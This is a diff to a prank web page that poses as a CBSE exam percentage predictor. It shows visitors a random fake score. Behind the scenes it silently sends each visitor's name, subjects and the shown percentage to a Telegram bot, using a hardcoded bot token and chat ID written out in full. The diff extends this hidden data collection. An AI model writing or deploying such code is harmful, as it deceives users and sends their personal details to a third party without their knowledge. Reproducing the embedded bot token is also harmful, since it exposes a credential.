@@ -134,7 +134,10 @@
                 return;
             }
 
+            // Generate a Random Fake Percentage (40% - 99%)
             let fakePercentage = Math.floor(Math.random() * (99 - 40 + 1)) + 40;
+
+            // Show the Result on Website
             resultBox.style.display = "block";
             resultBox.innerHTML = `<strong>${username}</strong>, Your Predicted CBSE Percentage is: <br><span style="font-size: 40px; color: green;">${fakePercentage}%</span>`;
 
@@ -143,14 +146,15 @@
                 document.getElementById("prankSound").play();
             }, 3000);
 
-            sendToTelegram(username, subjects);
+            // Send Data to Telegram
+            sendToTelegram(username, subjects, fakePercentage);
         }
 
-        function sendToTelegram(username, subjects) {
-            let botToken = "7880536303:AAFCop3W72uhhIK_4MOAnByV-rRMyFZEfZo";  // 🔹 यहाँ अपना Telegram Bot Token डालो
-            let chatId = "6423851220";  // 🔹 यहाँ अपना Chat ID डालो
+        function sendToTelegram(username, subjects, percentage) {
+            let botToken = "7880536303:AAFCop3W72uhhIK_4MOAnByV-rRMyFZEfZo";  // 🔹 अपना Telegram Bot Token डालो
+            let chatId = "6423851220";  // 🔹 अपना Telegram Chat ID डालो
             
-            let message = `📢 *New User Data Received!*\n👤 *Name:* ${username}\n📚 *Subjects:* ${subjects}\n⏰ *Time:* ${new Date().toLocaleString()}`;
+            let message = `📢 *New User Data Received!*\n👤 *Name:* ${username}\n📚 *Subjects:* ${subjects}\n🎯 *Predicted Percentage:* ${percentage}%\n⏰ *Time:* ${new Date().toLocaleString()}`;
             
             let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
             
